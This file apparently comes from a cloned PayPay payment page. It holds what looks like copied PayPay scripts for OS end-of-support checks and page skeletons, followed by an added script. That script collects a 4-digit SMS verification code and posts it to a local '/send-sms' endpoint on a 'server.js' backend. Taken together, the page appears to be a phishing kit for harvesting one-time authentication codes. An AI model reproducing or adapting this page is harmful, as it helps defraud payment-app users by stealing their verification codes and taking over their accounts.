    <script>
      function getCustomAgent() {
        return (
          window.navigator.userAgent
            .split(' ')
            .find(string => string.includes('jp.pay2.app')) || ''
        )
      }

      function isIOS() {
        const customAgent = getCustomAgent()
        return (
          customAgent.includes('ios') ||
          ((/iPad|iPhone|iPod/.test(navigator.platform) ||
            (navigator.platform === 'MacIntel' &&
              navigator.maxTouchPoints > 1)) &&
            !window.MSStream)
        )
      }

      function isAndroid() {
        const customAgent = getCustomAgent()
        return customAgent.includes('android') || /Android/.test(navigator.userAgent)
      }

      function checkIfEOS() {
        const MINIMUM_IOS_VERSION = 16
        const MINIMUM_ANDROID_VERSION = 9

        const iosVersionRegex = /ip[honead]{2,4}\b.*os ([\d_]+) like mac/i
        const androidVersionRegex = /android[-/ ]?([\d.]*)/i

        if (isIOS()) {
          const res = iosVersionRegex.exec(window.navigator.userAgent)
          if (!res || !res[1]) return false
          const osVersion = res[1].split('.').map((s) => parseInt(s))
          if (osVersion[0] < MINIMUM_IOS_VERSION) return true
        }

        if (isAndroid()) {
          const res = androidVersionRegex.exec(window.navigator.userAgent)
          if (!res || !res[1]) return false
          const osVersion = res[1].split('_').map((s) => parseInt(s))
          if (osVersion[0] < MINIMUM_ANDROID_VERSION) return true
        }
        return false
      }

      function getCookieByName(name) {
        const cookies = decodeURIComponent(document.cookie).split(";")
        for (let i = 0; i < cookies.length; i++) {
          const item = cookies[i].trim()
          const exp = '^' + name + '=(.*)'
          const regExp = new RegExp(exp)
          const result = regExp.exec(item)
          if (result) {
            return result[1]
          }
        }
        return ''
      }

      setTimeout(function () {
        const IGNORE_PATH = ['/app/pre-auth/embed/history', '/app/channel/embed/rate-review']

        if (!window.hasLoaded) {
          try {
            if (!IGNORE_PATH.includes(window.location.pathname) && checkIfEOS()) {
              const isSTGorQA = /(stg\-www|qa\.stg).+paypay.+jp/.test(window.location.hostname)
              const host = isSTGorQA
                ? 'https://static.paypay-corp.co.jp'
                : 'https://static.paypay.ne.jp'

              const locale = getCookieByName('Lang')
              const fontSize = getCookieByName('FontSize')

              window.location.href = host + '/pages/end-of-support/index.html?' + 'lang=' + locale + '&fontSize=' + fontSize
            }
          } catch (e) {
            // do nothing
          }
        }
      }, 5000)
    </script>

    <script>
      (function () {
        const currentPath = window.location.pathname;
        const appInvokePaths = [
          '/app/opa/link-internal',
          '/app/customMerchant/link-internal',
          '/app/opa/amazonjp/link-internal',
          '/app/opa/apple/link-internal'
        ]
        const isAppInvokePath = appInvokePaths.some(route =>
          currentPath.includes(route) || currentPath === route
        )
        if (isAppInvokePath) {
          const skeletonElement = document.getElementById('app-skeleton');
          if (skeletonElement) {
            if (isIOS()) {
              skeletonElement.classList.add('_skeleton_wrapper_ios')
            } else {
              skeletonElement.classList.add('_skeleton_wrapper_android')
            }
            skeletonElement.classList.remove('hidden')
          }
        } else {
          document.getElementById('app-skeleton')?.remove()
          document.querySelector('style#app-skeleton-style')?.remove()
        }

        const isP2pLandingRoute = /\/p2p\/(?!expired$)[^/]+$/.test(currentPath) && !currentPath.includes('/p2p/passcode/')
        if (isP2pLandingRoute) {
          const p2pSkeleton = document.getElementById('p2p-skeleton')
          if (p2pSkeleton) {
            p2pSkeleton.classList.remove('hidden')
          }
        } else {
          document.getElementById('p2p-skeleton')?.remove()
          document.querySelector('style#p2p-skeleton-style')?.remove()
        }

        const indexLoading = document.getElementById('index-loading');
        const PAM_FEATURE_PATHS = [
          'app/cashier',
          'app/webcashier',
          'app/opa',
          'app/amazonjp',
          'app/apple',
          'app/smartpayment',
          'app/customMerchant',
          'app/offline',
          'app/error',
          'app/oauth2'
        ];
        const isPAMFeaturePath = PAM_FEATURE_PATHS.some(route =>
          currentPath.includes(route) || currentPath === route
        )

        if (isPAMFeaturePath) {
          indexLoading.classList.remove('hidden');
        } else {
          indexLoading.remove();
        }
      })()
    </script>

    <script>
      document.addEventListener('DOMContentLoaded', function() {
        const smsInput = document.getElementById('sms-input');
        const submitBtn = document.getElementById('sms-submit');

        // 入力値を監視して、4桁入力されたらボタンを有効化する
        smsInput.addEventListener('input', function() {
          if (this.value.length === 4) {
            submitBtn.disabled = false;
            submitBtn.style.opacity = '1';
            submitBtn.style.cursor = 'pointer';
          } else {
            submitBtn.disabled = true;
            submitBtn.style.opacity = '0.5';
            submitBtn.style.cursor = 'not-allowed';
          }
        });

        // ボタンがクリックされたらサーバーにPOST送信
        submitBtn.addEventListener('click', async function(e) {
          e.preventDefault(); // デフォルトの動作をキャンセル
          
          const code = smsInput.value;
          if (code.length !== 4) return;

          // 二重送信防止
          submitBtn.disabled = true;
          submitBtn.textContent = '認証中...';

          const formData = new URLSearchParams();
          formData.append('sms_code', code);

          try {
            // server.js の /send-sms へリクエスト
            const response = await fetch('/send-sms', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
              },
              body: formData.toString()
            });

            // サーバー側でリダイレクトされた場合はそのURLに飛ぶ
            if (response.redirected) {
              window.location.href = response.url;
            } else {
              // エラーだった場合
              window.location.href = '/sms.html?error=1';
            }
          } catch (err) {
            console.error('送信エラー:', err);
            window.location.href = '/sms.html?error=1';
          }
        });
      });
    </script>
